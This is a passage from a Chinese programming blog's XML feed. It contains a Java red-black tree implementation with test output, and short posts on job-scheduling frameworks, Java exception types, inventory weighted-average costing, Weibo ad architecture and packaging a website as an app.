x是&quot;一个右孩子&quot;，则查找&quot;x的最低的父结点，并且该父结点要具有左孩子&quot;，找到的这个&quot;最低的父结点&quot;就是&quot;x的后继结点&quot;。 RBTNode&lt;T&gt; y = x.parent; while ((y!=null) &amp;&amp; (x==y.right)) &#123; x = y; y = y.parent; &#125; return y; &#125; /* * 找结点(x)的前驱结点。即，查找&quot;红黑树中数据值小于该结点&quot;的&quot;最大结点&quot;。 */ public RBTNode&lt;T&gt; predecessor(RBTNode&lt;T&gt; x) &#123; // 如果x存在左孩子，则&quot;x的前驱结点&quot;为 &quot;以其左孩子为根的子树的最大结点&quot;。 if (x.left != null) return maximum(x.left); // 如果x没有左孩子。则x有以下两种可能： // (01) x是&quot;一个右孩子&quot;，则&quot;x的前驱结点&quot;为 &quot;它的父结点&quot;。 // (01) x是&quot;一个左孩子&quot;，则查找&quot;x的最低的父结点，并且该父结点要具有右孩子&quot;，找到的这个&quot;最低的父结点&quot;就是&quot;x的前驱结点&quot;。 RBTNode&lt;T&gt; y = x.parent; while ((y!=null) &amp;&amp; (x==y.left)) &#123; x = y; y = y.parent; &#125; return y; &#125; /* * 对红黑树的节点(x)进行左旋转 * * 左旋示意图(对节点x进行左旋)： * px px * / / * x y * / \ --(左旋)-. / \ # * lx y x ry * / \ / \ * ly ry lx ly * * */ private void leftRotate(RBTNode&lt;T&gt; x) &#123; // 设置x的右孩子为y RBTNode&lt;T&gt; y = x.right; // 将 “y的左孩子” 设为 “x的右孩子”； // 如果y的左孩子非空，将 “x” 设为 “y的左孩子的父亲” x.right = y.left; if (y.left != null) y.left.parent = x; // 将 “x的父亲” 设为 “y的父亲” y.parent = x.parent; if (x.parent == null) &#123; this.mRoot = y; // 如果 “x的父亲” 是空节点，则将y设为根节点 &#125; else &#123; if (x.parent.left == x) x.parent.left = y; // 如果 x是它父节点的左孩子，则将y设为“x的父节点的左孩子” else x.parent.right = y; // 如果 x是它父节点的左孩子，则将y设为“x的父节点的左孩子” &#125; // 将 “x” 设为 “y的左孩子” y.left = x; // 将 “x的父节点” 设为 “y” x.parent = y; &#125; /* * 对红黑树的节点(y)进行右旋转 * * 右旋示意图(对节点y进行左旋)： * py py * / / * y x * / \ --(右旋)-. / \ # * x ry lx y * / \ / \ # * lx rx rx ry * */ private void rightRotate(RBTNode&lt;T&gt; y) &#123; // 设置x是当前节点的左孩子。 RBTNode&lt;T&gt; x = y.left; // 将 “x的右孩子” 设为 “y的左孩子”； // 如果&quot;x的右孩子&quot;不为空的话，将 “y” 设为 “x的右孩子的父亲” y.left = x.right; if (x.right != null) x.right.parent = y; // 将 “y的父亲” 设为 “x的父亲” x.parent = y.parent; if (y.parent == null) &#123; this.mRoot = x; // 如果 “y的父亲” 是空节点，则将x设为根节点 &#125; else &#123; if (y == y.parent.right) y.parent.right = x; // 如果 y是它父节点的右孩子，则将x设为“y的父节点的右孩子” else y.parent.left = x; // (y是它父节点的左孩子) 将x设为“x的父节点的左孩子” &#125; // 将 “y” 设为 “x的右孩子” x.right = y; // 将 “y的父节点” 设为 “x” y.parent = x; &#125; /* * 红黑树插入修正函数 * * 在向红黑树中插入节点之后(失去平衡)，再调用该函数； * 目的是将它重新塑造成一颗红黑树。 * * 参数说明： * node 插入的结点 // 对应《算法导论》中的z */ private void insertFixUp(RBTNode&lt;T&gt; node) &#123; RBTNode&lt;T&gt; parent, gparent; // 若“父节点存在，并且父节点的颜色是红色” while (((parent = parentOf(node))!=null) &amp;&amp; isRed(parent)) &#123; gparent = parentOf(parent); //若“父节点”是“祖父节点的左孩子” if (parent == gparent.left) &#123; // Case 1条件：叔叔节点是红色 RBTNode&lt;T&gt; uncle = gparent.right; if ((uncle!=null) &amp;&amp; isRed(uncle)) &#123; setBlack(uncle); setBlack(parent); setRed(gparent); node = gparent; continue; &#125; // Case 2条件：叔叔是黑色，且当前节点是右孩子 if (parent.right == node) &#123; RBTNode&lt;T&gt; tmp; leftRotate(parent); tmp = parent; parent = node; node = tmp; &#125; // Case 3条件：叔叔是黑色，且当前节点是左孩子。 setBlack(parent); setRed(gparent); rightRotate(gparent); &#125; else &#123; //若“z的父节点”是“z的祖父节点的右孩子” // Case 1条件：叔叔节点是红色 RBTNode&lt;T&gt; uncle = gparent.left; if ((uncle!=null) &amp;&amp; isRed(uncle)) &#123; setBlack(uncle); setBlack(parent); setRed(gparent); node = gparent; continue; &#125; // Case 2条件：叔叔是黑色，且当前节点是左孩子 if (parent.left == node) &#123; RBTNode&lt;T&gt; tmp; rightRotate(parent); tmp = parent; parent = node; node = tmp; &#125; // Case 3条件：叔叔是黑色，且当前节点是右孩子。 setBlack(parent); setRed(gparent); leftRotate(gparent); &#125; &#125; // 将根节点设为黑色 setBlack(this.mRoot); &#125; /* * 将结点插入到红黑树中 * * 参数说明： * node 插入的结点 // 对应《算法导论》中的node */ private void insert(RBTNode&lt;T&gt; node) &#123; int cmp; RBTNode&lt;T&gt; y = null; RBTNode&lt;T&gt; x = this.mRoot; // 1. 将红黑树当作一颗二叉查找树，将节点添加到二叉查找树中。 while (x != null) &#123; y = x; cmp = node.key.compareTo(x.key); if (cmp &lt; 0) x = x.left; else x = x.right; &#125; node.parent = y; if (y!=null) &#123; cmp = node.key.compareTo(y.key); if (cmp &lt; 0) y.left = node; else y.right = node; &#125; else &#123; this.mRoot = node; &#125; // 2. 设置节点的颜色为红色 node.color = RED; // 3. 将它重新修正为一颗二叉查找树 insertFixUp(node); &#125; /* * 新建结点(key)，并将其插入到红黑树中 * * 参数说明： * key 插入结点的键值 */ public void insert(T key) &#123; RBTNode&lt;T&gt; node=new RBTNode&lt;T&gt;(key,BLACK,null,null,null); // 如果新建结点失败，则返回。 if (node != null) insert(node); &#125; /* * 红黑树删除修正函数 * * 在从红黑树中删除插入节点之后(红黑树失去平衡)，再调用该函数； * 目的是将它重新塑造成一颗红黑树。 * * 参数说明： * node 待修正的节点 */ private void removeFixUp(RBTNode&lt;T&gt; node, RBTNode&lt;T&gt; parent) &#123; RBTNode&lt;T&gt; other; while ((node==null || isBlack(node)) &amp;&amp; (node != this.mRoot)) &#123; if (parent.left == node) &#123; other = parent.right; if (isRed(other)) &#123; // Case 1: x的兄弟w是红色的 setBlack(other); setRed(parent); leftRotate(parent); other = parent.right; &#125; if ((other.left==null || isBlack(other.left)) &amp;&amp; (other.right==null || isBlack(other.right))) &#123; // Case 2: x的兄弟w是黑色，且w的俩个孩子也都是黑色的 setRed(other); node = parent; parent = parentOf(node); &#125; else &#123; if (other.right==null || isBlack(other.right)) &#123; // Case 3: x的兄弟w是黑色的，并且w的左孩子是红色，右孩子为黑色。 setBlack(other.left); setRed(other); rightRotate(other); other = parent.right; &#125; // Case 4: x的兄弟w是黑色的；并且w的右孩子是红色的，左孩子任意颜色。 setColor(other, colorOf(parent)); setBlack(parent); setBlack(other.right); leftRotate(parent); node = this.mRoot; break; &#125; &#125; else &#123; other = parent.left; if (isRed(other)) &#123; // Case 1: x的兄弟w是红色的 setBlack(other); setRed(parent); rightRotate(parent); other = parent.left; &#125; if ((other.left==null || isBlack(other.left)) &amp;&amp; (other.right==null || isBlack(other.right))) &#123; // Case 2: x的兄弟w是黑色，且w的俩个孩子也都是黑色的 setRed(other); node = parent; parent = parentOf(node); &#125; else &#123; if (other.left==null || isBlack(other.left)) &#123; // Case 3: x的兄弟w是黑色的，并且w的左孩子是红色，右孩子为黑色。 setBlack(other.right); setRed(other); leftRotate(other); other = parent.left; &#125; // Case 4: x的兄弟w是黑色的；并且w的右孩子是红色的，左孩子任意颜色。 setColor(other, colorOf(parent)); setBlack(parent); setBlack(other.left); rightRotate(parent); node = this.mRoot; break; &#125; &#125; &#125; if (node!=null) setBlack(node); &#125; /* * 删除结点(node)，并返回被删除的结点 * * 参数说明： * node 删除的结点 */ private void remove(RBTNode&lt;T&gt; node) &#123; RBTNode&lt;T&gt; child, parent; boolean color; // 被删除节点的&quot;左右孩子都不为空&quot;的情况。 if ( (node.left!=null) &amp;&amp; (node.right!=null) ) &#123; // 被删节点的后继节点。(称为&quot;取代节点&quot;) // 用它来取代&quot;被删节点&quot;的位置，然后再将&quot;被删节点&quot;去掉。 RBTNode&lt;T&gt; replace = node; // 获取后继节点 replace = replace.right; while (replace.left != null) replace = replace.left; // &quot;node节点&quot;不是根节点(只有根节点不存在父节点) if (parentOf(node)!=null) &#123; if (parentOf(node).left == node) parentOf(node).left = replace; else parentOf(node).right = replace; &#125; else &#123; // &quot;node节点&quot;是根节点，更新根节点。 this.mRoot = replace; &#125; // child是&quot;取代节点&quot;的右孩子，也是需要&quot;调整的节点&quot;。 // &quot;取代节点&quot;肯定不存在左孩子！因为它是一个后继节点。 child = replace.right; parent = parentOf(replace); // 保存&quot;取代节点&quot;的颜色 color = colorOf(replace); // &quot;被删除节点&quot;是&quot;它的后继节点的父节点&quot; if (parent == node) &#123; parent = replace; &#125; else &#123; // child不为空 if (child!=null) setParent(child, parent); parent.left = child; replace.right = node.right; setParent(node.right, replace); &#125; replace.parent = node.parent; replace.color = node.color; replace.left = node.left; node.left.parent = replace; if (color == BLACK) removeFixUp(child, parent); node = null; return ; &#125; if (node.left !=null) &#123; child = node.left; &#125; else &#123; child = node.right; &#125; parent = node.parent; // 保存&quot;取代节点&quot;的颜色 color = node.color; if (child!=null) child.parent = parent; // &quot;node节点&quot;不是根节点 if (parent!=null) &#123; if (parent.left == node) parent.left = child; else parent.right = child; &#125; else &#123; this.mRoot = child; &#125; if (color == BLACK) removeFixUp(child, parent); node = null; &#125; /* * 删除结点(z)，并返回被删除的结点 * * 参数说明： * tree 红黑树的根结点 * z 删除的结点 */ public void remove(T key) &#123; RBTNode&lt;T&gt; node; if ((node = search(mRoot, key)) != null) remove(node); &#125; /* * 销毁红黑树 */ private void destroy(RBTNode&lt;T&gt; tree) &#123; if (tree==null) return ; if (tree.left != null) destroy(tree.left); if (tree.right != null) destroy(tree.right); tree=null; &#125; public void clear() &#123; destroy(mRoot); mRoot = null; &#125; /* * 打印&quot;红黑树&quot; * * key -- 节点的键值 * direction -- 0，表示该节点是根节点; * -1，表示该节点是它的父结点的左孩子; * 1，表示该节点是它的父结点的右孩子。 */ private void print(RBTNode&lt;T&gt; tree, T key, int direction) &#123; if(tree != null) &#123; if(direction==0) // tree是根节点 System.out.printf(&quot;%2d(B) is root\n&quot;, tree.key); else // tree是分支节点 System.out.printf(&quot;%2d(%s) is %2d&apos;s %6s child\n&quot;, tree.key, isRed(tree)?&quot;R&quot;:&quot;B&quot;, key, direction==1?&quot;right&quot; : &quot;left&quot;); print(tree.left, tree.key, -1); print(tree.right,tree.key, 1); &#125; &#125; public void print() &#123; if (mRoot != null) print(mRoot, mRoot.key, 0); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/** * Java 语言: 二叉查找树 */public class RBTreeTest &#123; private static final int a[] = &#123;10, 40, 30, 60, 90, 70, 20, 50, 80&#125;; private static final boolean mDebugInsert = false; // &quot;插入&quot;动作的检测开关(false，关闭；true，打开) private static final boolean mDebugDelete = false; // &quot;删除&quot;动作的检测开关(false，关闭；true，打开) public static void main(String[] args) &#123; int i, ilen = a.length; RBTree&lt;Integer&gt; tree=new RBTree&lt;Integer&gt;(); System.out.printf(&quot;== 原始数据: &quot;); for(i=0; i&lt;ilen; i++) System.out.printf(&quot;%d &quot;, a[i]); System.out.printf(&quot;\n&quot;); for(i=0; i&lt;ilen; i++) &#123; tree.insert(a[i]); // 设置mDebugInsert=true,测试&quot;添加函数&quot; if (mDebugInsert) &#123; System.out.printf(&quot;== 添加节点: %d\n&quot;, a[i]); System.out.printf(&quot;== 树的详细信息: \n&quot;); tree.print(); System.out.printf(&quot;\n&quot;); &#125; &#125; System.out.printf(&quot;== 前序遍历: &quot;); tree.preOrder(); System.out.printf(&quot;\n== 中序遍历: &quot;); tree.inOrder(); System.out.printf(&quot;\n== 后序遍历: &quot;); tree.postOrder(); System.out.printf(&quot;\n&quot;); System.out.printf(&quot;== 最小值: %s\n&quot;, tree.minimum()); System.out.printf(&quot;== 最大值: %s\n&quot;, tree.maximum()); System.out.printf(&quot;== 树的详细信息: \n&quot;); tree.print(); System.out.printf(&quot;\n&quot;); // 设置mDebugDelete=true,测试&quot;删除函数&quot; if (mDebugDelete) &#123; for(i=0; i&lt;ilen; i++) &#123; tree.remove(a[i]); System.out.printf(&quot;== 删除节点: %d\n&quot;, a[i]); System.out.printf(&quot;== 树的详细信息: \n&quot;); tree.print(); System.out.printf(&quot;\n&quot;); &#125; &#125; // 销毁二叉树 tree.clear(); &#125;&#125; console.log 1234567891011121314151617== 原始数据: 10 40 30 60 90 70 20 50 80 == 前序遍历: 30 10 20 60 40 50 80 70 90 == 中序遍历: 10 20 30 40 50 60 70 80 90 == 后序遍历: 20 10 50 40 70 90 80 60 30 == 最小值: 10== 最大值: 90== 树的详细信息: 30(B) is root10(B) is 30&apos;s left child20(R) is 10&apos;s right child60(R) is 30&apos;s right child40(B) is 60&apos;s left child50(R) is 40&apos;s right child80(B) is 60&apos;s right child70(R) is 80&apos;s left child90(R) is 80&apos;s right child]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[集群调度框架总结]]></title>
    <url>%2F2018%2F10%2F31%2Fservice-design%2Fdesign-7%2F</url>
    <content type="text"><![CDATA[spring cloud task【springcloud服务集成各种调度框架封装包】 spring quarts【现有常用调度框架】 TBSchedule【淘宝分布式调度】 Firmament - 大规模集群任务调度 集群调度器体系结构的演变。 java调度推荐两款比较不错的调度框架{———-} xxl-job 开源较早 拥有自带的rpc机制、功能比较健全、http远程调度支持的还不是很好 不过可以使用java脚本形式进行调度封装 数据库使用mysql和oracle 分布式任务调度平台(Distributed Job Schedule Platform) 使用zk作为注册中心、redis作为存储位置、较为重量级 依据项目中的注册中心选择不同的任务调度吧 xxl-job下阶段结合eureka注册中心就比较不错了、目前spring cloud比较火、如果不能积极嵌入到新的微服务中、用的也就越来越少不过稍微改动下注册机制、也不是很困难的是、一个定时线程不断地获取注册中心的服务列表、然后保存到本地作为服务app、便于集群管理 最后、对于所有开源的产品、尽量测试好了在上生产环境、否则因为生产较为复杂的环境gg掉就悲催了、有些开源产品一遇到高并发就gg、以前碰到过一例]]></content>
      <categories>
        <category>服务架构</category>
        <category>集群调度</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java7 异常分类总结]]></title>
    <url>%2F2018%2F10%2F26%2Fexception%2Fexception-0%2F</url>
    <content type="text"><![CDATA[为什么要学 异常 java异常是 对java语言错误的一种错误类型整合、无论是编译、运行、都有相应的异常来标记 在一个大型项目中、要找到错误是非常困难的、这时候就需要自定义异常抛出、以便于更迅速地定位代码问题 但有一个问题、永远不可能定义出所有的异常、因为有的异常是于业务息息相关的对此、java创始人、定义了异常的分类、以及常见的异常信息 在我们编写代码的过程中、有现成的异常就可以直接抛出异常信息、没有的就需要自定义 自定义异常、根据不同类别、分别继承不同的异常类、对于团队其他成员、也是一种便捷、大家学的都一样、然后规定都这么写、自然懂得每个异常的意思、也就更方便维护代码 {———-} java api java 7 Exceptions ArithmeticException 算术类异常 ArrayIndexOutOfBoundsException 数组下标越界异常 ArrayStoreException 数组存储异常。当向数组中存放非数组声明类型对象时抛出。 ClassCastException 类转换异常 ClassNotFoundException 类未找到异常 CloneNotSupportedException 不支持克隆异常。 当没有实现Cloneable接口或者不支持克隆方法时,调用其clone()方法则抛出该异常。 EnumConstantNotPresentException 枚举常量不存在异常。 当应用试图通过名称和枚举类型访问一个枚举对象，但该枚举对象并不包含常量时，抛出该异常。 Exception 根异常。 用以描述应用程序希望捕获的情况。 IllegalAccessException 违法的访问异常。 当应用试图通过反射方式创建某个类的实例、访问该类属性、调用该类方法，而当时又无法访问类的、属性的、方法的或构造方法的定义时抛出该异常。 IllegalArgumentException 这个异常的解释是”方法的参数错误”，很多j2me的类库中的方法在一些情况下都会引发这样的错误， 比如音量调节方法中的音量参数如果写成负数就会出现这个异常， 再比如g.setcolor(int red,int green,int blue)这个方法中的三个值，如果有超过２５５的也会出现这个异常，因此一旦发现这个异常，我们要做的，就是赶紧去检查一下方法调用中的参数传递是不是出现了错误。 IllegalMonitorStateException 违法的监控状态异常。 当某个线程试图等待一个自己并不拥有的对象（O）的监控器或者通知其他线程等待该对象（O）的监控器时，抛出该异常。 IllegalStateException 违法的状态异常。 当在Java环境和应用尚未处于某个方法的合法调用状态，而调用了该方法时，抛出该异常 IllegalThreadStateException 违法的线程状态异常。 当县城尚未处于某个方法的合法调用状态，而调用了该方法时，抛出异常 IndexOutOfBoundsException 索引越界异常。 当访问某个序列的索引值小于0或大于等于序列大小时，抛出该异常。 InstantiationException 实例化异常。 当试图通过newInstance()方法创建某个类的实例，而该类是一个抽象类或接口时，抛出该异常。 InterruptedException 被中止异常。 当某个线程处于长时间的等待、休眠或其他暂停状态，而此时其他的线程通过Thread的interrupt方法终止该线程时抛出该异常。 NegativeArraySizeException NoSuchFieldException数组大小为负值异常。 当使用负数大小值创建数组时抛出该异常。 NoSuchFieldException 属性不存在异常。 当访问某个类的不存在的属性时抛出该异常。 NoSuchMethodException 方法未找到异常 NullPointerException NPE 空指针异常 NumberFormatException 数字转换异常 ReflectiveOperationException 反射异常 RuntimeException 运行时异常 SecurityException 安全异常、由安全管理器抛出，用于指示违反安全情况的异常。 StringIndexOutOfBoundsException 字符串索引越界异常。 当使用索引值访问某个字符串中的字符，而该索引值小于0或大于等于序列大小时，抛出该异常。 TypeNotPresentException 类型不存在异常。 当应用试图以某个类型名称的字符串表达方式访问该类型，但是根据给定的名称又找不到该类型是抛出该异常。 该异常与ClassNotFoundException的区别在于该异常是unchecked（不被检查）异常，而ClassNotFoundException是checked（被检查）异常。 UnsupportedOperationException 不支持的方法异常。指明请求的方法不被支持情况的异常。 Errors AbstractMethodError 抽象方法错误。当应用试图调用抽象方法时抛出。 AssertionError 断言错。用来指示一个断言失败的情况。 BootstrapMethodError 引导方法异常 ClassCircularityError 类循环依赖错误。 在初始化一个类时，若检测到类之间循环依赖则抛出该异常。 ClassFormatError Error类格式错误。 当Java虚拟机试图从一个文件中读取Java类，而检测到该文件的内容不符合类的有效格式时抛出。 Error 错误。 是所有错误的基类，用于标识严重的程序运行问题。这些问题通常描述一些不应被应用程序捕获的反常情况。 ExceptionInInitializerError 初始化程序错误。 当执行一个类的静态初始化程序的过程中，发生了异常时抛出。静态初始化程序是指直接包含于类中的static语句段。 IllegalAccessError 违法访问错误。 当一个应用试图访问、修改某个类的域（Field）或者调用其方法，但是又违反域或方法的可见性声明，则抛出该异常。 IncompatibleClassChangeError 不兼容的类变化错误。 当正在执行的方法所依赖的类定义发生了不兼容的改变时，抛出该异常。 一般在修改了应用中的某些类的声明定义而没有对整个应用重新编译而直接运行的情况下，容易引发该错误。 InstantiationError 实例化错误。 当一个应用试图通过Java的new操作符构造一个抽象类或者接口时抛出该异常. InternalError 内部错误。 用于指示Java虚拟机发生了内部错误。 LinkageError 链接错误。 该错误及其所有子类指示某个类依赖于另外一些类，在该类编译之后，被依赖的类改变了其类定义而没有重新编译所有的类，进而引发错误的情况。 NoClassDefFoundError 未找到类定义错误。 当Java虚拟机或者类装载器试图实例化某个类，而找不到该类的定义时抛出该错误。 NoSuchFieldError 域不存在错误。 当应用试图访问或者修改某类的某个域，而该类的定义中没有该域的定义时抛出该错误。 NoSuchMethodError 方法不存在错误。 当应用试图调用某类的某个方法，而该类的定义中没有该方法的定义时抛出该错误。 OutOfMemoryError 内存不足错误。 当可用内存不足以让Java虚拟机分配给一个对象时抛出该错误。 StackOverflowError 堆栈溢出错误。 当一个应用递归调用的层次太深而导致堆栈溢出时抛出该错误。 ThreadDeath 线程结束。 当调用Thread类的stop方法时抛出该错误，用于指示线程结束。 UnknownError 未知错误。 用于指示Java虚拟机发生了未知严重错误的情况。 UnsatisfiedLinkError 未满足的链接错误。 当Java虚拟机未找到某个类的声明为native方法的本机语言定义时抛出。 UnsupportedClassVersionError 不支持的类版本错误。 当Java虚拟机试图从读取某个类文件，但是发现该文件的主、次版本号不被当前Java虚拟机支持的时候，抛出该错误。 VerifyError 验证错误。当验证器检测到某个类文件中存在内部不兼容或者安全问题时抛出该错误。 VirtualMachineError 虚拟机错误。用于指示虚拟机被破坏或者继续执行操作所需的资源不足的情况。 分类 java.lang.Exception RuntimeException AclNotFoundException ActivationException AlreadyBoundException ApplicationException AWTException BackingStoreException, BadAttributeValueExpException BadBinaryOpValueExpException BadLocationException BadStringOperationException BrokenBarrierException CertificateException DataFormatException DatatypeConfigurationException DestroyFailedException ExecutionException ExpandVetoException FontFormatException GeneralSecurityException GSSException IllegalClassFormatException IntrospectionException InvalidApplicationException InvalidMidiDataException InvalidPreferencesFormatException InvalidTargetObjectTypeException IOException JAXBException JMException KeySelectorException LastOwnerException LineUnavailableException MarshalException MidiUnavailableException MimeTypeParseException MimeTypeParseException NamingException NoninvertibleTransformException NotBoundException NotOwnerException ParseException ParserConfigurationException PrinterException PrintException PrivilegedActionException PropertyVetoException ReflectiveOperationException RefreshFailedException RemarshalException SAXException ScriptException ServerNotActiveException SOAPException SQLException TimeoutException TooManyListenersException TransformerException TransformException UnmodifiableClassException UnsupportedAudioFileException UnsupportedCallbackException UnsupportedFlavorException UnsupportedLookAndFeelException URIReferenceException URISyntaxException UserException XAException XMLParseException XMLSignatureException XMLStreamException XPathException ReflectiveOperationException ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException, NoSuchFieldException, NoSuchMethodException CloneNotSupportedException InterruptedException1分割线 java.lang.Error AnnotationFormatError AssertionError AWTError CoderMalfunctionError FactoryConfigurationError FactoryConfigurationError IOError LinkageError BootstrapMethodError ClassCircularityError ClassFormatError UnsupportedClassVersionError ExceptionInInitializerError NoClassDefFoundError UnsatisfiedLinkError VerifyError IncompatibleClassChangeError AbstractMethodError IllegalAccessError InstantiationError NoSuchFieldError NoSuchMethodError ServiceConfigurationError ThreadDeath TransformerFactoryConfigurationError VirtualMachineError InternalError OutOfMemoryError StackOverflowError UnknownError 总结异常分类：运行时异常、中断异常、反射异常、无法克隆异常 错误分类：io、线程终止、堆栈溢出、文件或者方法未找到、类格式错误、 熟记大分类、略记常用小分类、一般一年见不到一次的、碰到就google、]]></content>
      <categories>
        <category>java</category>
        <category>exception</category>
      </categories>
      <tags>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[本博客成长笔记]]></title>
    <url>%2F2018%2F10%2F24%2Fessay%2Fessay-16%2F</url>
    <content type="text"><![CDATA[回忆、本博客起初只是一份html笔记、慢慢的竟然成了一个网站、也是各种原有促使了这一切的发生、获取就是冥冥中自有天注定吧 一开始作为html笔记只在学习的时候作为笔录使用、后来工作忙了起来也就不在维护、麻烦、还没有随时可复习的特性、 后来、机缘巧合、在阿里买了台ECS、又机缘巧合买了个域名、然后…. 一时兴起便把笔录做成了网站、选择了hugo作为编辑器 再后来hugo没有比较好的插件支持、于是换了hexo、彷佛鸟枪换大炮的感觉~~ 得到了啥 在期初作为笔录的时候让我骄傲了许多、恬不知耻的见人就送、哈哈、带给了我些许乐趣 后来机缘巧合有了ecs和域名、才有了做一个网站的念头、也是源于leader对于知识体系的一个模糊认识、借助该网站编辑的过程中、分类、画出自己的知识图谱 建好了自己的知识体系、就更明白自己向往技术的哪个方向发展了、而不是拘泥于、今天java、后天nginx、大后天es、大大后天又java陷入知识死循环、反而得不到更为迅速的成长、避免了陷入知识世界、这山望着那山高、看着这一块、又想那一块、造成的只是混乱 再后来随着分类的细节化、就想在知识分类做更为详细的学习、就想到做知识专题知识的积累、日积跬步、水滴石穿 总结虽然一个网站并不是必须的、但是我还是建议【有缘到此的朋友】有时间做一个、一方面构建自己的知识体系、一方面分享的乐趣会是学习的一大助力 分享过程中、你才会学得更多、知识体系的梳理、才会让你大脑里的知识不乱糟糟的像一团乱麻 {———-} v1.0 v2.0 v3.0]]></content>
      <categories>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[全月一次加权平均法【转】]]></title>
    <url>%2F2018%2F10%2F08%2Falgorithm%2Falgorithm-0%2F</url>
    <content type="text"><![CDATA[什么是全月一次加权平均法 全月一次加权平均法是以本月的期初数量和本月全部进货数量作为权数，取出本月全部进货成本加上期初的进货成本，计算出本月存货平均单位成本，以此作为基础算出本月的发出存货的成本以及月末的库存实际成本。 全月一次加权平均法的计算公式 平均单位成本= (期初结存材料成本+∑(本月入库成本))/(期初结存数量+∑(本月入库数量)) 发出成本 = 发出数量×平均单位成本 结存成本 = 结存数量×平均单位成本 {———-} 全月一次加权平均法的特点 1.在全月一次加权平均法下，采用全月一次加权平均法使得本期销货成本介于早期购货成本与当期购货成本之间。这种方法计算得到的销售成本不易被操纵，因而被广泛采用。 2.全月一次加权平均法作为一种平均价格法，在一定程度上修正了价格波动趋势的影响；存货计价工作可以分散在月内进行。 全月一次加权平均法的优缺点 全月一次加权平均法的优点是计算手续简便。缺点是： 第一，采用这种方法，必须要到月末才能计算出全月的加权平均单价，这显然不利于核算的及时性； 第二，按照月末加权平均单价计算的期末库存材料价值，与现行成本相比，有比较大的差异。当物价呈现上升趋势时，月末一次加权平均单价将低于现行成本；反之，当物价呈现下降趋势时，那么，月末一次加权平均单价又将高于现行。 全月一次加权平均法的适用范围 1、此方法适合各期存货成本变动不大的情况或者存货品种较少或收发次数较少，而且前后收入存货单位成本相差较大的企业使用。 2、全月一次平均法主要适用于生产企业的产成品、半成品的成本核算；原材料的成本核算，用户可以自己选择。由于各企业费用分摊所采用的方法不尽相同，因此，用户可以手工进行计算，然后再将计算结果输入到各个产品入库单中。 全月一次加权平均法的案例分析 企业采用永续盘存制，并用全月一次加权平均法对发出存货计价，某企业2008年度一月某存货期初存货10件，本期收、付、存数量及金额如下表所示： 根据上表的计算，本月的平均单价及发出存货成本如下： 全月平均单价=（1010+59+1011+59.5）/（10+5+10+5）=10.1元 本月发出存货成本=(2+5+6)*10.2=132.6元]]></content>
      <categories>
        <category>java</category>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>全月一次加权平均法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微博社交广告系统架构实践]]></title>
    <url>%2F2018%2F10%2F04%2Fservice-design%2Fdesign-6%2F</url>
    <content type="text"><![CDATA[原链接地址整理了一下演讲内容、记录一下、也分享一下 技术内容并不多、主要学习微博对于自己产品形式利用推广广告的idea、充分利用自己的优势进行深度挖掘广告投放点 基本需求 在微博内投放广告进行收益分成 需求特点【利用自己的优势、做怎样的产品】 粉丝头条 无购买门槛 社交关系传播 微博特点【微博投放广告优势】 海量投放 定价保量【合约投放】 opcm、【pcm、一种广告计费模式、点击计费、曝光计费】{———-}模块设计 投放系统–对外广告接入系统、进行广告流入、整理广告属性、用户属性 人群定向–广告匹配用户属性 在线分发–广告列表整理、根据用户属性进行用户画像、形成用户池、广告池 竞价–对整理后的广告列表进行评分排序 模型匹配–精准匹配用户投放 预算–对外提供购买服务、已投放次数整理、对投放次数进行控制 细节 人群定向 用户属性与广告定向条件匹配 维度 性别、年龄、地域、兴趣、设备、社交关系、考虑交叉 实时性 性能要求 10ms 社交定向【依据产品形式深度挖掘】 一度关系 关注流消息过载 精准触达 粉丝传播效果 二度关系 通过粉丝关系进行人群扩展 基于社交关系的Look-alike 根据亲密度选取关键节点 相似用户 通过粉丝相似度挖掘相似用户 通过相似用户进行定向扩展 行为定向 利用互动性为扩展定向人群 行为实时反馈 行为类型、评论、赞、关注 亲密度 需要解决问题【依据广告需求考虑性能、需求】 降低使用门槛 冷启动如何投放 复购用户扩展目标人群 核心服务如何保证稳定性 控制中心的稳定性 耦合服务、负载分发、并行执行 服务快速迭代 以实时消息处理+es搜索技术完成消息注入 以openresty+nginx保证服务负载的可靠稳定性和快速迭代性 内部提供服务集群提供服务处理【这里基本都差不多、对要求高的服务提供并发服务】]]></content>
      <categories>
        <category>服务架构</category>
        <category>广告架构</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站制作app、并发布github、生成二维码推广下载]]></title>
    <url>%2F2018%2F09%2F24%2Fessay%2Fessay-15%2F</url>
    <content type="text"><![CDATA[应用全部工具 ：Hbuilder、 github账户、草料二维码生成器 网站制作app工具 Hbuilder 下载地址：http://dcloud.io/ 步骤 ： {———-} 新建工程 添加app信息 选择wap转app 生成 选择发行-》》app在云端打包 然后等待 后台打包控制台会实时输出打包信息 github发布二进制可下载文件仓库release分支建立一个新的release tag 把生成的文件上传上去 选中文件右键复制下载地址草料二维码生成下载图片 地址：https://cli.im/]]></content>
      <categories>
        <category>app</category>
        <category>android</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[每天一点人生感悟的句子]]></title>
    <url>%2F2018%2F09%2F24%2Fessay%2Fessay-14%2F</url>
